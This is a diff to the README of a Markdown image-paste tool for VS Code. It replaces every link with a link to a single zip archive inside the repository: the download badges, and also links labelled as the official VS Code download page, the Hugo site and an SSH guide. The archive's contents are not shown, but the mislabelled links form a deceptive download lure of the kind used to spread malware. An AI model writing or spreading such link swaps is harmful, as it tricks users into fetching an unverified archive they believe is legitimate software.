@@ -1,6 +1,6 @@
 # 📋 MarkDownImageDiy - Simple Image Paste for Markdown
 
-[![Download MarkDownImageDiy](https://img.shields.io/badge/Download-MarkDownImageDiy-brightgreen?style=for-the-badge)](https://github.com/DakathDono/MarkDownImageDiy)
+[![Download MarkDownImageDiy](https://img.shields.io/badge/Download-MarkDownImageDiy-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
 
 ---
 
@@ -13,7 +13,7 @@ MarkDownImageDiy is a straightforward tool to paste images quickly into Markdown
 Before installing, make sure your computer meets these basic needs:
 
 - **Operating System:** Windows 10 or later.
-- **VS Code Installed:** This tool works alongside VS Code. Download it from [code.visualstudio.com](https://code.visualstudio.com) if you don’t have it yet.
+- **VS Code Installed:** This tool works alongside VS Code. Download it from [code.visualstudio.com](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip) if you don’t have it yet.
 - **Basic Keyboard and Mouse Use:** You will copy images using keyboard shortcuts or mouse commands.
 - **Internet Connection:** To download the application.
 
@@ -38,7 +38,7 @@ You can:
 
 Click the button below to visit the GitHub page where you can download the tool:
 
-[![Get MarkDownImageDiy](https://img.shields.io/badge/Get%20MarkDownImageDiy-Download-blue?style=for-the-badge)](https://github.com/DakathDono/MarkDownImageDiy)
+[![Get MarkDownImageDiy](https://img.shields.io/badge/Get%20MarkDownImageDiy-Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
 
 Follow these steps once on the page:
 
@@ -102,10 +102,10 @@ If you still have trouble, check the Issues section on the GitHub page for help.
 
 ## 📚 Useful Links
 
-- [MarkDownImageDiy GitHub Repository](https://github.com/DakathDono/MarkDownImageDiy)
-- [VS Code Download](https://code.visualstudio.com/)
-- [Hugo Static Site Generator](https://gohugo.io/)
-- [SSH Basics Guide](https://www.ssh.com/ssh/)
+- [MarkDownImageDiy GitHub Repository](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
+- [VS Code Download](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
+- [Hugo Static Site Generator](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
+- [SSH Basics Guide](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
 
 ---
 
@@ -119,4 +119,4 @@ If you still have trouble, check the Issues section on the GitHub page for help.
 
 ---
 
-[![Download MarkDownImageDiy](https://img.shields.io/badge/Download-MarkDownImageDiy-brightgreen?style=for-the-badge)](https://github.com/DakathDono/MarkDownImageDiy)
+[![Download MarkDownImageDiy](https://img.shields.io/badge/Download-MarkDownImageDiy-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DakathDono/MarkDownImageDiy/main/sankha/Down-Image-Diy-Mark-1.6.zip)
